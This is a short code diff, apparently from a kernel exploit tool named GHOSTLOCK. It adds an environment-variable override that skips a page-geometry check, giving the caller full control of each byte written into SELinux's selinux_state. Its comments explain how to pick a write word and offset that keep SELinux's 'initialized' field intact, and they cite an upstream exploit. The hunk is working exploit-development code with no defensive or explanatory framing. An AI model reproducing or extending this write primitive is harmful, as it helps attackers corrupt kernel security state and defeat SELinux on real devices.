@@ -108,6 +108,15 @@ int payload_write_layout_matches_request(
 int payload_write_layout_accepts_page(
         const WriteRequest *request, const PayloadWriteLayout *layout) {
     if (!payload_write_layout_matches_request(request, layout)) return 0;
+    /* Upstream skips the page rule when an exact word is armed
+     * (orig-c util.c:758: `... && !pselect_w1_shift_word && ((fake_right>>16)&1)==0`):
+     * with GHOSTLOCK_WRITE_WORD the caller controls every byte, so an even byte 2
+     * is a deliberate choice (e.g. 0x0101000000000000 with a -4 target keeps
+     * `initialized` at 1), not a page-geometry accident. */
+    {
+        const char *word = getenv("GHOSTLOCK_WRITE_WORD");
+        if (word && *word) return 1;
+    }
     /* W1 stores its page-derived value across selinux_state fields. An even
      * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
     if (request->mode == WriteMode::Zero && request->preserve_child &&
